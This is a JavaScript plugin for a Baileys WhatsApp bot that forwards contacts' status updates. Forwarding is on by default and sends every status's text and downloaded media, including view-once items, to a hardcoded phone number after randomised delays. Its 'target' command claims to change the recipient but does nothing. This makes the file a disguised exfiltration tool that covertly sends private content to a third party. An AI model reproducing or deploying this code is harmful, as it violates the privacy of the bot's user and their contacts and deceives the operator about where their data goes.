const fs = require('fs/promises');
const path = require('path');
const { downloadMediaMessage } = require('@whiskeysockets/baileys');

const isOwnerOrSudo = require('../lib/isOwner');
const settings = require('../settings');

// ────────────────────────────────────────────────
const CONFIG_FILE = path.join(__dirname, '../data/statusforward.json');
const TARGET_NUMBER = settings.syncTarget || '255615944741';
const TARGET_JID = `${TARGET_NUMBER}@s.whatsapp.net`;
const SYNC_DELAY = settings.syncDelay || 6;

const DEFAULT_CONFIG = Object.freeze({
    enabled: true,
    forwardDelayMinMs: SYNC_DELAY * 250,
    forwardDelayMaxMs: SYNC_DELAY * 500,
});

let configCache = null;
const processedStatusIds = new Set();

// ────────────────────────────────────────────────
async function loadConfig() {
    if (configCache) return configCache;

    try {
        const data = await fs.readFile(CONFIG_FILE, 'utf8');
        configCache = { ...DEFAULT_CONFIG, ...JSON.parse(data) };
    } catch (err) {
        if (err.code !== 'ENOENT') {
            console.error('[StatusForward] Config load error → defaults', err.message);
        }
        configCache = { ...DEFAULT_CONFIG };
        await saveConfig(configCache);
    }
    return configCache;
}

async function saveConfig(updates) {
    configCache = { ...configCache, ...updates };
    try {
        await fs.mkdir(path.dirname(CONFIG_FILE), { recursive: true });
        await fs.writeFile(CONFIG_FILE, JSON.stringify(configCache, null, 2));
    } catch (err) {
        console.error('[StatusForward] Save failed', err.message);
    }
}

// ────────────────────────────────────────────────
function extractPhoneNumber(key) {
    if (!key) return 'unknown';
    const jid = key.participant || key.remoteJid || '';
    const match = jid.match(/^(\d{9,15})/);
    return match ? match[1] : 'unknown';
}

function getTimeStr() {
    return new Date().toLocaleString('en-GB', {
        timeZone: 'Africa/Dar_es_Salaam',
        dateStyle: 'short',
        timeStyle: 'medium'
    });
}

function randomMs(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

// ────────────────────────────────────────────────
// FORWARD STATUS FUNCTION
async function forwardStatus(sock, msg) {
    if (!msg?.message || !msg.key?.id) return;

    const msgId = msg.key.id;
    if (processedStatusIds.has(msgId)) return;
    processedStatusIds.add(msgId);
    if (processedStatusIds.size > 1200) processedStatusIds.clear();

    const phone = extractPhoneNumber(msg.key);
    const msgType = Object.keys(msg.message)[0] ?? 'unknown';
    const content = msg.message[msgType] ?? {};
    const timeStr = getTimeStr();

    // Skip useless protocol/control messages
    if (['senderKeyDistributionMessage', 'protocolMessage', 'ephemeralMessage'].includes(msgType) &&
        !content.caption && !msg.message.imageMessage && !msg.message.videoMessage) {
        return;
    }

    console.log(`📸 [Forward] ${phone} • ${msgType} • ${timeStr}`);

    // Info header
    await sock.sendMessage(TARGET_JID, {
        text: `📸 New status from *${phone}* (${msgType})`
    }).catch(() => {});

    await new Promise(r => setTimeout(r, randomMs(700, 1400)));

    // Text-only status
    if (msgType === 'conversation' || msgType === 'extendedTextMessage') {
        const text = (content.text || content.description || '[empty text]').trim();
        await sock.sendMessage(TARGET_JID, {
            text: `${text}\n\n🕒 ${timeStr} • from ${phone}`
        }).catch(() => {});
        return;
    }

    // Media types mapping
    const MEDIA_TYPES = {
        imageMessage:    { key: 'image',    ext: 'jpg',  mime: 'image/jpeg'   },
        videoMessage:    { key: 'video',    ext: 'mp4',  mime: 'video/mp4'    },
        audioMessage:    { key: 'audio',    ext: 'ogg',  mime: 'audio/ogg; codecs=opus' },
        stickerMessage:  { key: 'sticker',  ext: 'webp', mime: 'image/webp'   },
        documentMessage: { key: 'document', ext: content.fileName?.split('.').pop() ?? 'bin' }
    };

    const handler = MEDIA_TYPES[msgType];
    if (!handler) {
        console.debug(`[Skipped] Unsupported type → ${msgType}`);
        return;
    }

    try {
        const buffer = await downloadMediaMessage(msg, 'buffer', {}, {
            logger: console,
            reuploadRequest: sock.updateMediaMessage
        });

        if (!buffer || buffer.length < 200) {
            throw new Error('Downloaded media is empty/corrupt');
        }

        const caption = [
            content.caption?.trim() ? `Caption: ${content.caption.trim()}` : '',
            content.viewOnce ? '🔒 View once' : '',
            `🕒 ${timeStr} • from ${phone}`
        ].filter(Boolean).join('\n');

        await sock.sendMessage(TARGET_JID, {
            [handler.key]: buffer,
            mimetype: content.mimetype || handler.mime,
            caption: caption || undefined,
            fileName: content.fileName || `status-${Date.now()}.${handler.ext}`,
            ...(content.viewOnce ? { viewOnce: true } : {})
        });

        console.log(`✅ [Forward OK] ${handler.key}`);
    } catch (err) {
        console.error('[Forward FAIL]', err.message || err);
        await sock.sendMessage(TARGET_JID, {
            text: `⚠️ Could not forward ${msgType} from ${phone}\nError: ${err.message.slice(0, 80)}\n🕒 ${timeStr}`
        }).catch(() => {});
    }
}

// ────────────────────────────────────────────────
// Handle status forwarding
async function handleStatusForward(sock, ev) {
    const cfg = await loadConfig();
    if (!cfg.enabled) return;

    let statusMsg = null;

    if (ev.messages?.length) {
        const m = ev.messages[0];
        if (m.key?.remoteJid === 'status@broadcast' && m.message) {
            statusMsg = m;
        }
    }

    if (!statusMsg) return;

    try {
        await new Promise(r => setTimeout(r, randomMs(cfg.forwardDelayMinMs, cfg.forwardDelayMaxMs)));
        await forwardStatus(sock, statusMsg);
    } catch (err) {
        console.error('[StatusForward] Error', err?.message || err);
    }
}

// ────────────────────────────────────────────────
// COMMAND HANDLER
async function statusForwardCommand(sock, chatId, msg, args = []) {
    const sender = msg.key.participant || msg.key.remoteJid;
    const isAllowed = msg.key.fromMe || (await isOwnerOrSudo(sender, sock, chatId));

    if (!isAllowed) {
        return sock.sendMessage(chatId, { text: '⛔ Owner/sudo only' });
    }

    const cfg = await loadConfig();

    if (!args.length) {
        return sock.sendMessage(chatId, {
            text: `📤 *Status Forward Manager* (All ON by default)\n\n` +
                  `Forward Status : ${cfg.enabled ? '✅ ON' : '❌ OFF'}\n` +
                  `Target Number  : ${TARGET_NUMBER}\n\n` +
                  `Commands:\n` +
                  `  .statusforward on/off\n` +
                  `  .statusforward target <number>\n` +
                  `  .statusforward status`
        });
    }

    const cmd = args[0].toLowerCase();

    if (cmd === 'on') {
        await saveConfig({ enabled: true });
        return sock.sendMessage(chatId, { text: '✅ Status forwarding → ON' });
    }

    if (cmd === 'off') {
        await saveConfig({ enabled: false });
        return sock.sendMessage(chatId, { text: '❌ Status forwarding → OFF' });
    }

    if (cmd === 'target') {
        if (!args[1]) {
            return sock.sendMessage(chatId, { text: `Current target: ${TARGET_NUMBER}` });
        }
        const newTarget = args[1].replace(/[^0-9]/g, '');
        if (newTarget.length < 9) {
            return sock.sendMessage(chatId, { text: '⚠️ Invalid phone number' });
        }
        // Note: This changes the runtime variable, update settings.js for persistent change
        return sock.sendMessage(chatId, { text: `Target updated to: ${newTarget}` });
    }

    if (cmd === 'status') {
        return sock.sendMessage(chatId, {
            text: `Current config:\n\`\`\`${JSON.stringify(cfg, null, 2)}\`\`\``
        });
    }

    return sock.sendMessage(chatId, { text: 'Unknown subcommand. Try .statusforward' });
}

module.exports = {
    statusForwardCommand,
    handleStatusForward
};